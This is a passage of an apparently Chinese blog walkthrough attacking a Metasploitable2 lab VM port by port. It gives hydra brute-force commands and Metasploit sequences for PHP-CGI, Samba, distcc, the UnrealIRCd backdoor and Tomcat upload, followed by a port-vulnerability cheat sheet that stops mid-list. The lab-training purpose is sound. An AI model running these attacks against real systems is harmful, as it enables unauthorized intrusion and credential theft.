+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span> telnet -L user.txt  -P password.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591846786014.png" alt="1591846786014"></p>
+<p><strong>连接</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591846965570.png" alt="1591846965570"></p>
+<h2 id="25端口"><a href="#25端口" class="headerlink" title="25端口"></a>25端口</h2><p><strong>SMTP是一个相对简单的基于<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E6%9C%AC" target="_blank" rel="noopener">文本</a>的<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">协议</a>。在其之上指定了一条<a href="https://zh.wikipedia.org/wiki/%E8%A8%8A%E6%81%AF" target="_blank" rel="noopener">消息</a>的一个或多个接收者（在大多数情况下被确认是存在的），然后消息文本会被传输。可以很简单地通过<a href="https://zh.wikipedia.org/wiki/Telnet" target="_blank" rel="noopener">telnet</a>程序来测试一个SMTP服务器。SMTP使用<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">TCP</a>端口25</strong><br>利用方式：</p>
+<ol>
+<li>爆破：弱口令</li>
+<li>未授权访问</li>
+</ol>
+<p>参考文章：<a href="https://www.sqlsec.com/2017/08/smtp.html" target="_blank" rel="noopener">https://www.sqlsec.com/2017/08/smtp.html</a></p>
+<h2 id="53端口"><a href="#53端口" class="headerlink" title="53端口"></a>53端口</h2><p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（<span class="symbol">https:</span>/<span class="regexp">/www.seebug.org/vuldb</span><span class="regexp">/ssvid-96718）</span></span><br><span class="line"><span class="regexp">（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（https:/</span><span class="regexp">/baijiahao.baidu.com/s</span>?id=<span class="number">1577362432987749706</span>&amp;wfr=spider&amp;<span class="keyword">for</span>=pc）</span><br><span class="line">（<span class="number">3</span>）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（<span class="symbol">http:</span>/<span class="regexp">/www.edu.cn/xxh</span><span class="regexp">/fei/zxz</span><span class="regexp">/201503/t</span>20150305_1235269.shtml）（<span class="number">4</span>）DNS劫持。（<span class="symbol">https:</span>/<span class="regexp">/blog.csdn.net/qq</span>_32447301/article/details/<span class="number">77542474</span>）</span><br></pre></td></tr></table></figure>
+
+<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>扫描目录，发现phpmyadmin和phpinfo.php<br><img src="/2020/06/15/Metasploitable2/1591864439751.png" alt="1591864439751"></p>
+<p>PHP版本为5.2.4<br>使用PHP-CGI远程任意代码执行漏洞进行攻击</p>
+<blockquote>
+<p>PHP-CGI远程代码执行漏洞（CVE-2012-1823）<br>影响版本 php &lt; 5.3.12 or php &lt; 5.4.2</p>
+</blockquote>
+<blockquote>
+<p>msf &gt; search cve:2012-1823</p>
+<p>msf &gt; use exploit/multi/http/php_cgi_arg_injection</p>
+<p>msf exploit(php_cgi_arg_injection) &gt; show options</p>
+<p>msf exploit(php_cgi_arg_injection) &gt; set rhost 192.168.211.157</p>
+<p>rhost =&gt; 192.168.211.157</p>
+<p>msf exploit(php_cgi_arg_injection) &gt; run</p>
+</blockquote>
+<p><img src="/2020/06/15/Metasploitable2/1591864645403.png" alt="1591864645403"></p>
+<p>成功获得会话</p>
+<p><img src="/2020/06/15/Metasploitable2/1591864665322.png" alt="1591864665322"></p>
+<h2 id="139-445端口"><a href="#139-445端口" class="headerlink" title="139/445端口"></a>139/445端口</h2><p><strong>139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。</strong></p>
+<p><strong>445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。</strong></p>
+<p><strong>对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（<a href="https://blog.csdn.net/qq_41880069/article/details/82908131）" target="_blank" rel="noopener">https://blog.csdn.net/qq_41880069/article/details/82908131）</a></strong><br><strong>对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（<a href="https://blog.csdn.net/god_7z1/article/details/6773652）" target="_blank" rel="noopener">https://blog.csdn.net/god_7z1/article/details/6773652）</a></strong><br><strong>对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（<a href="https://blog.warhut.cn/dmbj/145.html）" target="_blank" rel="noopener">https://blog.warhut.cn/dmbj/145.html）</a></strong><br><strong>对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</strong></p>
+<p>该端口开放的服务为Samba smbd 3.X-4.X</p>
+<blockquote>
+<p>search samba</p>
+<p>use exploit/multi/samba/usermap_script</p>
+<p>set rhosts 192.168.211.157</p>
+<p>run</p>
+</blockquote>
+<p><img src="/2020/06/15/Metasploitable2/1591865799083.png" alt="1591865799083"></p>
+<h2 id="2121端口"><a href="#2121端口" class="headerlink" title="2121端口"></a>2121端口</h2><p>改端口仍然是ftp端口，可以使用爆破</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">-s</span> 2121 <span class="selector-tag">ftp</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span> <span class="selector-tag">admin</span> <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591867632649.png" alt="1591867632649"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span> <span class="number">2121</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591867673441.png" alt="1591867673441"></p>
+<h2 id="2409端口"><a href="#2409端口" class="headerlink" title="2409端口"></a>2409端口</h2><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。</p>
+<p>在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
+<ol>
+<li>未授权访问（[<a href="https://www.freebuf.com/articles/network/159468.html）" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/159468.html）</a>(<a href="http://www.secist.com/archives/6192.htm" target="_blank" rel="noopener">http://www.secist.com/archives/6192.htm</a>)</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanner/nfs/nfsmount</span><br></pre></td></tr></table></figure>
+
+<h2 id="3306端口"><a href="#3306端口" class="headerlink" title="3306端口"></a>3306端口</h2><p>该端口为MySQL数据库默认端口，常用的攻击手法有</p>
+<blockquote>
+<p>爆破：弱口令<br>身份认证漏洞：CVE-2012-2122<br>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器<br>Phpmyadmin万能密码绕过：用户名：‘localhost’@‘@” 密码任意</p>
+</blockquote>
+<p>爆破</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">-s</span> 3306 <span class="selector-tag">mysql</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span>  <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3632端口"><a href="#3632端口" class="headerlink" title="3632端口"></a>3632端口</h2><p><strong>Distcc用于将大规模的代码放到网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是 XCode 1.5 版本及其他版本的 distcc 2.x 版本配署对于服务器端口的访问不限制造成的。<br>简单的说就是服务对端口和执行的任务检查不够严格，从而造成攻击者可以利用分布式的编译任务执行自己想要执行的命令。</strong></p>
+<p>使用msf攻击</p>
+<blockquote>
+<p>use exploit/unix/misc/distcc_exec</p>
+<p>set rhosts 192.168.211.157</p>
+</blockquote>
+<p><img src="/2020/06/15/Metasploitable2/1591884406824.png" alt="1591884406824"></p>
+<h2 id="5432端口"><a href="#5432端口" class="headerlink" title="5432端口"></a>5432端口</h2><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。<br> （1）爆破：弱口令：postgres postgres<br> （2）缓冲区溢出：CVE-2014-2669<a href="http://drops.xmd5.com/static/drops/tips-6449.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-6449.html</a><br> （3）远程代码执行：CVE-2018-1058。<a href="https://www.secpulse.com/archives/69153.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/69153.html</a></p>
+<ol>
+<li>爆破：</li>
+</ol>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">-s</span> 5432 <span class="selector-tag">postgres</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span>  <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591881378614.png" alt="1591881378614"></p>
+<p>或者使用msf</p>
+<blockquote>
+<p>use auxiliary/scanner/postgres/postgres_login</p>
+<p>set rhosts 192.168.211.157</p>
+</blockquote>
+<p><img src="/2020/06/15/Metasploitable2/1591881465105.png" alt="1591881465105"></p>
+<p>远程登录</p>
+<blockquote>
+<p>psql -h 192.168.211.157 –u postgres</p>
+</blockquote>
+<p><img src="/2020/06/15/Metasploitable2/1591881659308.png" alt="1591881659308"></p>
+<h2 id="5900端口"><a href="#5900端口" class="headerlink" title="5900端口"></a>5900端口</h2><p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。</p>
+<p>VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：</p>
+<ol>
+<li>VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。</li>
+<li>cain同样支持对VNC的嗅探，同时支持端口修改。</li>
+<li>VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。</li>
+<li>VNC拒绝服务攻击（CVE-2015-5239）。（<a href="http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）" target="_blank" rel="noopener">http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）</a></li>
+<li>VNC权限提升（CVE-2013-6886）。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> vnc未授权访问</span><br><span class="line">	auxiliary/scanner/vnc/vnc_none_auth</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6667端口"><a href="#6667端口" class="headerlink" title="6667端口"></a>6667端口</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">irc实时聊天服务，可提权</span><br><span class="line"> 	exploit/unix/irc/unreal_ircd_3281_backdoor</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>use exploit/unix/irc/unreal_ircd_3281_backdoor</p>
+<p>set rhosts 192.168.211.157</p>
+<p>run</p>
+</blockquote>
+<p><img src="/2020/06/15/Metasploitable2/1591887506202.png" alt="1591887506202"></p>
+<h2 id="8180端口"><a href="#8180端口" class="headerlink" title="8180端口"></a>8180端口</h2><p>Apache Tomcat弱口令</p>
+<p><img src="/2020/06/15/Metasploitable2/1591869167703.png" alt="1591869167703"></p>
+<p>使用msf进行攻击</p>
+<blockquote>
+<p>search tomcat</p>
+<p>use auxiliary/scanner/http/tomcat_mgr_login</p>
+<p>set RHOSTS 192.168.211.157</p>
+<p>set RPORT 8180</p>
+<p>run</p>
+</blockquote>
+<p><img src="/2020/06/15/Metasploitable2/1591869383056.png" alt="1591869383056"></p>
+<p>之后再使用exploit/multi/http/tomcat_mgr_upload模块进行getshell</p>
+<blockquote>
+<p>use exploit/multi/http/tomcat_mgr_upload</p>
+<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 192.168.211.157</p>
+<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8180</p>
+<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; set httpusername tomcat</p>
+<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword tomcat</p>
+<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit</p>
+</blockquote>
+<p><img src="/2020/06/15/Metasploitable2/1591870573718.png" alt="1591870573718"></p>
+<h1 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#21端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 爆破（hydra、msf中的ftp爆破模块）</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 后门vsftpd ：version2到<span class="number">2.3</span><span class="number">.4</span>存在后门漏洞，攻击者可以通过该漏洞获取root权限。</span><br><span class="line">   unix/ftp/vsftpd_234_backdoor</span><br><span class="line">      （https:<span class="comment">//www.freebuf.com/column/143480.html）</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#22端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 爆破（hydra、msf中的ssh爆破模块） </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> openssh 用户枚举 CVE<span class="number">-2018</span><span class="number">-15473</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#23端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 爆破（hydra、msf中的ssh爆破模块）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#80端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> MS15<span class="number">-034</span> http.sys远程代码执行漏洞（windoiws <span class="number">8.1</span>, <span class="number">2012</span>, <span class="keyword">or</span> <span class="number">2012</span>R2有效。）</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> IIS web dav缓冲区溢出（工具：WebDAVScan）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#161端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> snmp默认团体名漏洞</span><br><span class="line">   （nmap -sU -p161 --script=snmp-brute.nse IP）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#135&amp;139&amp;445端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> MS17<span class="number">-010</span>永恒之蓝</span><br><span class="line">   （auxiliary/scanner/smb/smb_ms17_010）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#443端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 心脏出血</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#873端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> rsync未授权访问</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#1099端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> java_rmi反序列化远程命令执行</span><br><span class="line">   nmap -sV -p <span class="number">1099</span> IP --script=rmi-vuln-classloader</span><br><span class="line">   注册信息暴露</span><br><span class="line">   nmap -sV -p <span class="number">1099</span> IP --script=rmi-dumpregistry.nse </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#1433端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> SQLServer暴力破解</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#1521端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 弱口令 </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Oracle tns中间人远程注册投毒漏洞</span><br><span class="line">   （auxiliary/scanner/oracle/tnspoison_checker）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#1883端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> mqtt未授权访问</span><br><span class="line">   使用Nmap探测mqtt服务</span><br><span class="line">   使用MQTT.fx检测是否存在未授权</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#2049端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> nfs网络文件系统敏感信息泄漏漏洞（scanner/nfs/nfsmount）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#2181端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> zookeeper未授权访问</span><br><span class="line">   执行以下命令即可远程获取该服务器的环境</span><br><span class="line">   <span class="keyword">echo</span> envi | nc ip port </span><br><span class="line">   直接连接：</span><br><span class="line">   ./zkCli.sh -server ip:port</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#2375端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> docker未授权访问</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#3306端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Mysql弱口令</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#3389端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 远程桌面弱口令</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> MS12<span class="number">-020</span></span><br><span class="line">   检测auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">    	 Dos攻击模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> CVE<span class="number">-2019</span><span class="number">-0708</span></span><br><span class="line">   auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#5900端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> vnc未授权访问</span><br><span class="line">   auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#6000端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> X11弱口令 </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> X11未授权访问</span><br><span class="line">   auxiliary/scanner/x11/open_x11</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#6379端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> redis未授权访问（dbscanner）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#6666&amp;6667端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> irc实时聊天服务，可提权</span><br><span class="line">   exploit/unix/irc/unreal_ircd_3281_backdoor</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#7001&amp;7002端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> weblogic反序列化</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 控制台弱口令</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#7777端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> jdwp-java远程命令</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#8080端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Tomcat弱口令</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 危险的Http请求</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Tomcat远程代码执行漏洞（https:<span class="comment">//www.freebuf.com/column/159200.html）</span></span><br><span class="line">   Tomcat任意文件上传。（http:<span class="comment">//liehu.tass.com.cn/archives/836）</span></span><br><span class="line">   Tomcat远程代码执行&amp;信息泄露。（https:<span class="comment">//paper.seebug.org/399/）</span></span><br><span class="line">   Jboss远程代码执行。（http:<span class="comment">//mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）</span></span><br><span class="line">   Jboss反序列化漏洞。（https:<span class="comment">//www.zybuluo.com/websec007/note/838374）</span></span><br><span class="line">   Jboss漏洞利用。（https:<span class="comment">//blog.csdn.net/u011215939/article/details/79141624）</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#8161端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> activemq远程代码执行</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> activemq未授权访问（弱口令）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#9000端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> fastcgi远程代码执行</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#9001端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> supervisor远程命令执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#9090端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> websphere爆破/java反序列化/弱口令</span><br><span 